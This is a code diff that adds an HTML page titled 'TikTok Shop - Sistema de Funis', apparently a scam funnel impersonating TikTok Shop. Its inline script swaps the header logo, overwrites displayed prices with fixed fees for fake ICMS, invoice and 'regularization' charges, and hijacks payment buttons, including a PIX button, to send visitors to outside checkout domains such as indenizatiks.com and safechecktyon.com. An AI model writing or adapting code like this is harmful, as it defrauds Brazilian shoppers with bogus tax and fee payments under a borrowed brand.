@@ -1,0 +1,187 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TikTok Shop - Sistema de Funis</title>
+    <meta name="description" content="Sistema de funis de vendas para rastreamento e cobrança de taxas especiais" />
+    <meta name="author" content="TikTok Shop" />
+
+    <meta property="og:title" content="TikTok Shop - Sistema de Funis" />
+    <meta property="og:description" content="Sistema de funis de vendas para rastreamento e cobrança de taxas especiais" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@Lovable" />
+    <meta name="twitter:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
+    <script type="module" crossorigin src="/assets/index-BPUuobmi.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-DSToUPS7.css">
+  </head>
+
+  <body>
+    <div id="root"></div>
+    <script>
+      (function(){
+        var url = 'https://d3m889aznlr23d.cloudfront.net/img/events/id/458/458868042/assets/ae82441d2f15b4ef8ceedfb0e5b636ad.Primary-fullcolor-white.png';
+        function getTargetPrice(){
+          var p = window.location.pathname;
+          if(p === '/emissao-nf') return 'R$22,00';
+          if(p === '/emissao-icms') return 'R$17,01';
+          return null;
+        }
+
+        function getTargetBigPrice(){
+          var p = window.location.pathname;
+          if(p === '/regularizar') return 'R$ 26,90';
+          return null;
+        }
+        var targetCheckoutUrlICMS = 'https://checkout.indenizatiks.com/VCCL1O8SCS1N';
+        var targetCheckoutUrlManuseio = 'https://checkout.indenizatiks.com/VCCL1O8SCS1O';
+        var targetCheckoutUrlRegularizar = 'https://checkout.indenizatiks.com/VCCL1O8SCS1P';
+        var targetCheckoutUrlImportacao = 'https://checkout.indenizatiks.com/VCCL1O8SCS1Q';
+        var targetCheckoutUrlProduct = 'https://pay.safechecktyon.com/xambWcNi';
+        var targetCheckoutUrlPix = 'https://pay.safechecktyon.com/BhkkKtms';
+        function swapHeaderContent(){
+          var headers = document.querySelectorAll('header');
+          headers.forEach(function(header){
+            var containers = header.querySelectorAll('.container');
+            containers.forEach(function(container){
+              var cl = container.classList;
+              if(!(cl.contains('flex') && cl.contains('items-center'))) return;
+              var icon = container.querySelector('svg.lucide-gift') || container.querySelector('svg.lucide');
+              var titleSpan = Array.from(container.querySelectorAll('span')).find(function(el){
+                var t = (el.textContent||'').trim().toLowerCase();
+                return t === 'tiktok shop';
+              });
+              if(icon || titleSpan){
+                var img = document.createElement('img');
+                img.src = url;
+                img.className = 'w-auto';
+                img.alt = '';
+                var uniformH = 75;
+                img.style.height = uniformH + 'px';
+                container.innerHTML = '';
+                container.appendChild(img);
+                // shrink header bar height
+                try {
+                  header.style.paddingTop = '16px';
+                  header.style.paddingBottom = '16px';
+                  header.style.backgroundImage = 'none';
+                  header.style.backgroundColor = 'black';
+                } catch(_) {}
+              }
+            });
+          });
+        }
+
+        function swapPriceValue(){
+          var target = getTargetPrice();
+          if(!target) return;
+          var spans = document.querySelectorAll('span.font-bold.text-2xl');
+          spans.forEach(function(sp){
+            var txt = (sp.textContent||'').trim();
+            if(/^R\$\s?\d{1,3}(\.\d{3})*,\d{2}$/.test(txt) && txt !== target){
+              sp.textContent = target;
+            }
+          });
+        }
+
+        function swapBigPriceValue(){
+          var target = getTargetBigPrice();
+          if(!target) return;
+          var ps = document.querySelectorAll('p.text-center.text-5xl.font-bold.text-green-700');
+          ps.forEach(function(el){
+            var txt = (el.textContent||'').trim();
+            if(/^R\$\s?\d{1,3}(\.\d{3})*,\d{2}$/.test(txt) && txt !== target){
+              el.textContent = target;
+            }
+          });
+        }
+
+        function overrideCheckoutButton(){
+          var buttons = document.querySelectorAll('button');
+          buttons.forEach(function(btn){
+            var txt = (btn.textContent||'').trim();
+            if(btn.getAttribute('data-checkout-overridden') === 'true') return;
+
+            var path = window.location.pathname;
+
+            // 1. /emissao-icms
+            if(path === '/emissao-icms' || txt.includes('Pagar o ICMS')){
+              btn.setAttribute('data-checkout-overridden','true');
+              btn.addEventListener('click', function(ev){
+                try { ev.preventDefault(); ev.stopPropagation(); } catch(_) {}
+                var q = window.location.search || '';
+                window.location.href = targetCheckoutUrlICMS + q;
+              }, true);
+              return;
+            }
+
+            // 2. /manuseio
+            if(path === '/manuseio'){
+              btn.setAttribute('data-checkout-overridden','true');
+              btn.addEventListener('click', function(ev){
+                try { ev.preventDefault(); ev.stopPropagation(); } catch(_) {}
+                var q = window.location.search || '';
+                window.location.href = targetCheckoutUrlManuseio + q;
+              }, true);
+              return;
+            }
+
+            // 3. /regularizar
+            if(path === '/regularizar'){
+              btn.setAttribute('data-checkout-overridden','true');
+              btn.addEventListener('click', function(ev){
+                try { ev.preventDefault(); ev.stopPropagation(); } catch(_) {}
+                var q = window.location.search || '';
+                window.location.href = targetCheckoutUrlRegularizar + q;
+              }, true);
+              return;
+            }
+
+            // 4. /importacao
+            if(path === '/importacao'){
+              btn.setAttribute('data-checkout-overridden','true');
+              btn.addEventListener('click', function(ev){
+                try { ev.preventDefault(); ev.stopPropagation(); } catch(_) {}
+                var q = window.location.search || '';
+                window.location.href = targetCheckoutUrlImportacao + q;
+              }, true);
+              return;
+            }
+
+            if(txt.includes('ENVIAR PRODUTO')){
+              btn.setAttribute('data-checkout-overridden','true');
+              btn.addEventListener('click', function(ev){
+                try { ev.preventDefault(); ev.stopPropagation(); } catch(_) {}
+                var q = window.location.search || '';
+                window.location.href = targetCheckoutUrlProduct + q;
+              }, true);
+            }
+            if(txt.includes('Gerar PIX para Pagamento')){
+              btn.setAttribute('data-checkout-overridden','true');
+              btn.addEventListener('click', function(ev){
+                try { ev.preventDefault(); ev.stopPropagation(); } catch(_) {}
+                var q = window.location.search || '';
+                window.location.href = targetCheckoutUrlPix + q;
+              }, true);
+            }
+          });
+        }
+        function ready(fn){
+          if(document.readyState === 'complete' || document.readyState === 'interactive') fn();
+          else document.addEventListener('DOMContentLoaded', fn);
+        }
+        ready(function(){
+          swapHeaderContent();
+          var mo = new MutationObserver(function(){ swapHeaderContent(); swapPriceValue(); swapBigPriceValue(); overrideCheckoutButton(); });
+          mo.observe(document.body, {childList:true,subtree:true});
+          swapPriceValue();
+          swapBigPriceValue();
+          overrideCheckoutButton();
+        });
+      })();
+    </script>
+  </body>
+</html>
